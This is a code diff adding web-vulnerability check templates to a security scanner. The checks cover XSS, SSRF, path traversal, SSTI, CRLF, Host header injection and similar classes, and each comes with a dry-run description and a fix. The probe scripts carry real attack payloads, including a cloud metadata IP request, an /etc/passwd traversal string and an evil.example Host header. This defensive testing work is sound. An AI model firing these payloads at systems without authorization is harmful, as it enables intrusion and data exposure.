@@ -312,6 +312,275 @@ curl -s -I https://{sub} | head -10
             [cj],
         )
 
+    # -- 11. Reflected XSS -----------------------------------------------------
+    xss = _first(findings, key="xss_dom_sink") or _first(findings, plugin="xss") \
+        or _first(findings, value_contains="<script")
+    if xss:
+        add(
+            "xss-reflected", "Reflected XSS (canary reflection test)",
+            "high", 80,
+            "Your scan found script sinks or script-ish content. A unique canary proves "
+            "raw reflection, which is the real XSS signal, not guesswork.",
+            f"""import requests
+base = "{base}"
+canary = 'qx7Z\\'"<>'  # unique, harmless
+for p in ["q", "search", "s", "keyword", "name"]:
+    r = requests.get(base, params={{p: canary}}, timeout=10)
+    if canary in r.text:
+        print("RAW REFLECTION via", p)
+        break""",
+            "py",
+            [
+                "Fetch the base page and extract up to 3 form input names.",
+                "Send the unique canary in common query params plus the form fields.",
+                "If the RAW canary with unencoded < appears in the HTML, XSS is real.",
+                "Report which param reflected. Do not try script execution.",
+            ],
+            "HTML-encode all user input on output. Set Content-Security-Policy.",
+            [xss],
+        )
+
+    # -- 12. Open redirect -----------------------------------------------------
+    ored = _first(findings, value_contains="redirect") or _first(findings, plugin="redirect") \
+        or _first(findings, key="endpoint")
+    if ored:
+        add(
+            "open-redirect", "Open redirect (no-follow 3xx check)",
+            "medium", 70,
+            "Your scan found redirect behavior or endpoint params. A no-follow request "
+            "with an external URL proves whether the server redirects off-site.",
+            f"""import requests
+base = "{base}"
+for p in ["next", "redirect", "url", "return", "dest", "target", "continue", "r"]:
+    r = requests.get(base, params={{p: "https://example.com/"}},
+                     allow_redirects=False, timeout=10)
+    if r.status_code in (301, 302, 303, 307, 308) and "example.com" in r.headers.get("location", ""):
+        print("OPEN REDIRECT via", p)
+        break""",
+            "py",
+            [
+                "Use a client that does NOT follow redirects.",
+                "Probe redirect-ish params with https://example.com/ as the value.",
+                "A 3xx with Location pointing at example.com confirms the bug.",
+                "Check login/logout links too, they often pass next= URLs.",
+            ],
+            "Allowlist redirect targets. Reject or sanitize absolute URLs.",
+            [ored],
+        )
+
+    # -- 13. SSRF ----------------------------------------------------------------
+    ssrf = _first(findings, key="ssrf_prone_param") or _first(findings, plugin="ssrf")
+    if ssrf:
+        add(
+            "ssrf", "Server-side request forgery (metadata IP probe)",
+            "critical", 85,
+            "Your scan flagged a URL-taking parameter. If the server fetches the cloud "
+            "metadata IP, you have SSRF, and credential exposure is on the table.",
+            f"""import requests
+base = "{base}"
+probe = "http://169.254.169.254/latest/meta-data/ami-id"
+for p in ["url", "uri", "path", "file", "dest", "target", "redirect", "u"]:
+    r = requests.get(base, params={{p: probe}}, timeout=15)
+    if "ami-id" in r.text.lower() or "instance-id" in r.text.lower():
+        print("SSRF CONFIRMED via", p)
+        break  # report immediately, do not dig for credentials""",
+            "py",
+            [
+                "Probe URL-ish params with the cloud metadata IP address.",
+                "If metadata markers come back, SSRF is confirmed.",
+                "Report IMMEDIATELY. Do not read or retain any credentials.",
+                "Treat the box as potentially compromised until keys are rotated.",
+            ],
+            "Block cloud metadata IPs. Allowlist outbound fetch targets.",
+            [ssrf],
+        )
+
+    # -- 14. IDOR -----------------------------------------------------------------
+    idor = _first(findings, key="idor_candidate") or _first(findings, plugin="idor")
+    if idor:
+        add(
+            "idor", "Insecure direct object reference (IDOR)",
+            "high", 80,
+            "Your scan found numeric object IDs in links or params. Fetching a neighbor "
+            "ID and comparing JSON bodies proves missing per-object checks.",
+            f"""import requests, re, json
+base = "{base}"
+r = requests.get(base, timeout=10)
+ids = re.findall(r"/users/(\\d+)", r.text) + re.findall(r"[?&]id=(\\d+)", r.text)
+oid = int(ids[0])
+for n in (oid + 1, oid - 1):
+    rn = requests.get(base, params={{"id": n}}, timeout=10)
+    print(n, rn.status_code, len(rn.text))
+# Both 200 with different JSON id values = IDOR signal""",
+            "py",
+            [
+                "Scrape numeric IDs from links or query params on the page.",
+                "Request id+1 and id-1 with GET (read-only).",
+                "Both 200 with substantial DIFFERENT JSON bodies = IDOR signal.",
+                "Otherwise it needs manual testing with an authenticated session.",
+            ],
+            "Enforce per-object authorization on every endpoint that takes an ID.",
+            [idor],
+        )
+
+    # -- 15. Auth bypass ----------------------------------------------------------
+    ab = _first(findings, value_contains="admin") or _first(findings, plugin="auth")
+    if ab:
+        add(
+            "auth-bypass", "Missing admin authentication gate",
+            "high", 75,
+            "Your scan mentions admin or auth surfaces. Common admin paths sometimes "
+            "return 200 without ever showing a login form.",
+            f"""import requests
+base = "{base}"
+paths = ["/admin", "/admin/", "/administrator", "/wp-admin", "/dashboard", "/manager/html"]
+for p in paths:
+    r = requests.get(base + p, timeout=10)
+    t = r.text.lower()
+    if r.status_code == 200 and 'type="password"' not in t and "login" not in t:
+        print("UNGATED:", p)
+        break""",
+            "py",
+            [
+                "GET common admin paths (read-only, nothing modified).",
+                "A 200 with no password field or login markers = ungated area.",
+                "Redirects to /login mean the gate is working. Leave it alone.",
+            ],
+            "Put every admin path behind auth. Deny unknown paths at the edge.",
+            [ab],
+        )
+
+    # -- 16. Path traversal ---------------------------------------------------------
+    trav = _first(findings, value_contains="../") or _first(findings, value_contains="/etc/passwd")
+    if trav:
+        add(
+            "dir-traversal", "Path traversal (read-only passwd check)",
+            "high", 75,
+            "Your scan saw dot-dot or passwd references. A classic traversal payload in "
+            "file-ish params proves the leak with zero damage.",
+            f"""import requests
+base = "{base}"
+payload = "....//....//....//etc/passwd"
+for p in ["file", "path", "page", "include", "template", "name", "f"]:
+    r = requests.get(base, params={{p: payload}}, timeout=10)
+    if "root:x:0:0" in r.text:
+        print("TRAVERSAL CONFIRMED via", p)
+        break""",
+            "py",
+            [
+                "Probe file-ish params with ....//....//....//etc/passwd.",
+                "If 'root:x:0:0' appears in the response, traversal is real.",
+                "Read-only check. Do not request other sensitive files.",
+            ],
+            "Canonicalize paths and reject '..'. Never build paths from user input.",
+            [trav],
+        )
+
+    # -- 17. XXE -------------------------------------------------------------------
+    xxe = _first(findings, value_contains="<?xml") or _first(findings, value_contains="content-type: application/xml")
+    if xxe:
+        add(
+            "xxe", "XML external entity injection (entity expansion test)",
+            "high", 70,
+            "Your scan found XML handling. A harmless internal entity proves the parser "
+            "expands entities, which is the XXE signal.",
+            f"""import requests
+base = "{base}"
+payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe "xxeProbe9">]><r>&xxe;</r>'
+r = requests.get(base, params={{"xml": payload}}, timeout=10)
+print("ENTITY EXPANDED:", "xxeProbe9" in r.text)
+# Note: most XXE needs POST, so also test manually if an XML endpoint exists""",
+            "py",
+            [
+                "Send the safe internal-entity payload via ?xml= (GET only).",
+                "If 'xxeProbe9' is reflected expanded, XXE is real.",
+                "If not, it is inconclusive over GET: test manually with POST.",
+                "Never use external entities or file reads in testing.",
+            ],
+            "Disable DTDs and external entities in the XML parser.",
+            [xxe],
+        )
+
+    # -- 18. SSTI -------------------------------------------------------------------
+    ssti = _first(findings, value_contains="{{") or _first(findings, value_contains="jinja") \
+        or _first(findings, value_contains="twig")
+    if ssti:
+        add(
+            "ssti", "Server-side template injection (math evaluation test)",
+            "high", 75,
+            "Your scan found template syntax hints. A unique math payload proves "
+            "evaluation without false positives.",
+            f"""import requests
+base = "{base}"
+for p in ["name", "q", "search", "template", "view"]:
+    for payload in ("{{{{1336*7}}}}", "${{1336*7}}"):
+        r = requests.get(base, params={{p: payload}}, timeout=10)
+        if "9352" in r.text:
+            print("SSTI CONFIRMED via", p, payload)
+            raise SystemExit""",
+            "py",
+            [
+                "Check the baseline page does not already contain '9352'.",
+                "Send {{1336*7}} and ${1336*7} in template-ish params.",
+                "If '9352' appears, the server evaluated the template. SSTI real.",
+                "Stop there. Do not chain to code execution.",
+            ],
+            "Never render user input as a template. Use logicless output encoding.",
+            [ssti],
+        )
+
+    # -- 19. CRLF injection ---------------------------------------------------------
+    crlf = _first(findings, key="param") or _first(findings, key="endpoint")
+    if crlf:
+        add(
+            "crlf", "CRLF / header injection (response header check)",
+            "medium", 60,
+            "Your scan found parameters or endpoints. Some apps reflect input into "
+            "response headers without stripping CR/LF, enabling header injection.",
+            f"""import requests
+base = "{base}"
+for p in ["next", "url", "redirect", "q"]:
+    # raw URL keeps %0d%0a literal (requests would double-encode via params)
+    r = requests.get(base + "/?" + p + "=test%0d%0aX-Injected-Probe9:%20yes", timeout=10)
+    if "x-injected-probe9" in {{k.lower() for k in r.headers}}:
+        print("CRLF INJECTION via", p)
+        break""",
+            "py",
+            [
+                "Send a CRLF payload with an X-Injected-Probe9 header line.",
+                "Pass the raw URL so %0d%0a stays literal (GET only).",
+                "If the response headers contain x-injected-probe9, it is real.",
+            ],
+            "Strip CR/LF from anything reflected into headers. Validate redirects.",
+            [crlf],
+        )
+
+    # -- 20. Host header injection -----------------------------------------------------
+    hh = _first(findings, value_contains="password reset") or _first(findings, key="endpoint")
+    if hh:
+        add(
+            "host-header", "Host header injection (reset-link poisoning check)",
+            "medium", 65,
+            "Your scan hints at password-reset flows or endpoints. If the app trusts "
+            "the Host header, reset links can point at an attacker domain.",
+            f"""import requests
+base = "{base}"
+r = requests.get(base, headers={{"Host": "evil.example"}}, allow_redirects=False, timeout=10)
+loc = r.headers.get("location", "")
+print("LOCATION REFLECTS HOST:", "evil.example" in loc)
+print("BODY REFLECTS HOST:", "evil.example" in r.text)
+# Poisoned Host -> password reset emails point at evil.example""",
+            "py",
+            [
+                "Send one GET with Host: evil.example, no redirect follow.",
+                "If evil.example lands in Location or body links, injection is real.",
+                "Check the password-reset flow manually with a test account.",
+                "Do not send reset links to real users.",
+            ],
+            "Validate Host against a whitelist. Build absolute URLs from config.",
+            [hh],
+        )
+
     # Rank: severity first, then confidence
     rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}
     cands.sort(key=lambda c: (rank.get(c["severity"], 4), -c["confidence"]))
@@ -390,6 +659,66 @@ def dry_run(candidate_id: str, base: str) -> List[str]:
             "[>] Would do: embed page in a local HTML file, open in browser",
             "[>] Would check: whether the page renders inside the frame",
             "[ok] Dry run complete. 0 requests planned.",
+        ],
+        "xss-reflected": [
+            "[>] Would send: 1 baseline GET + up to 8 canary GETs (read-only)",
+            "[>] Would check: whether the raw canary qx7Z'\"<> is reflected",
+            "[>] Would NOT: execute scripts or steal sessions",
+            "[ok] Dry run complete. ~9 read-only requests planned.",
+        ],
+        "open-redirect": [
+            "[>] Would send: 8 GETs with allow_redirects=False (read-only)",
+            "[>] Would check: 3xx Location pointing at example.com",
+            "[>] Would NOT: send anyone to an attacker site",
+            "[ok] Dry run complete. 8 read-only requests planned.",
+        ],
+        "ssrf": [
+            "[>] Would send: 8 GETs with the metadata IP as a param value",
+            "[>] Would check: ami-id / instance-id markers in the response",
+            "[>] Would NOT: read credentials, fetch other internal hosts",
+            "[ok] Dry run complete. 8 read-only requests planned.",
+        ],
+        "idor": [
+            "[>] Would send: 1 page GET + 2 neighbor-ID GETs (read-only)",
+            "[>] Would check: both 200 with different JSON object data",
+            "[>] Would NOT: enumerate more IDs or touch another account",
+            "[ok] Dry run complete. 3 read-only requests planned.",
+        ],
+        "auth-bypass": [
+            "[>] Would send: 6 GETs to common admin paths (read-only)",
+            "[>] Would check: 200 with no login form markers",
+            "[>] Would NOT: attempt logins or access admin functions",
+            "[ok] Dry run complete. 6 read-only requests planned.",
+        ],
+        "dir-traversal": [
+            "[>] Would send: 7 GETs with traversal payload in file-ish params",
+            "[>] Would check: 'root:x:0:0' in the response",
+            "[>] Would NOT: read other sensitive files",
+            "[ok] Dry run complete. 7 read-only requests planned.",
+        ],
+        "xxe": [
+            "[>] Would send: 1 GET with safe internal-entity XML in ?xml=",
+            "[>] Would check: whether 'xxeProbe9' expands and reflects",
+            "[>] Would NOT: use external entities or file reads",
+            "[ok] Dry run complete. 1 read-only request planned.",
+        ],
+        "ssti": [
+            "[>] Would send: 1 baseline GET + 10 math-payload GETs (read-only)",
+            "[>] Would check: whether '9352' appears in any response",
+            "[>] Would NOT: chain to code execution",
+            "[ok] Dry run complete. 11 read-only requests planned.",
+        ],
+        "crlf": [
+            "[>] Would send: 4 GETs with CRLF payload (raw URL, read-only)",
+            "[>] Would check: x-injected-probe9 in the response headers",
+            "[>] Would NOT: inject real security headers or cookies",
+            "[ok] Dry run complete. 4 read-only requests planned.",
+        ],
+        "host-header": [
+            "[>] Would send: 1 GET with Host: evil.example, no redirect follow",
+            "[>] Would check: evil.example in Location or body links",
+            "[>] Would NOT: trigger reset emails to real users",
+            "[ok] Dry run complete. 1 read-only request planned.",
         ],
     }
     lines.extend(profiles.get(candidate_id, [
